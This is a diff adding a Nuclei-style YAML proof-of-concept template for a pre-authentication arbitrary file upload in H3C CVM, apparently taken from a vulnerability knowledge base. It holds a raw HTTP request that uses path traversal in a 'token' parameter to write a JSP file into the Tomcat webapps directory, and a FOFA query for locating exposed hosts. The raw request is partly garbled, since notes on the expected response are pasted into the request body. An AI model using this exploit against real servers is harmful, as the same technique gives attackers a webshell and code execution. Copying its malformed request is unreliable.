@@ -1,0 +1,45 @@
+id: poc-uzxze5q4xgo8v4b1
+info:
+  name: H3C CVM 前台任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/uzxze5q4xgo8v4b1'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: uzxze5q4xgo8v4b1
+    fofa: app="H3C-CVM"
+http:
+- raw:
+  - 'POST /cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/dudesuite.jsp&name=123 HTTP/1.1
+
+
+    Content-Range: bytes 0-10/20
+
+
+    Accept-Encoding: gzip
+
+
+
+
+    <%out.println("dudesuite");%>
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    success
+
+
+    # 上传文件定位
+
+    /cas/js/lib/buttons/dudesuite.jsp'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
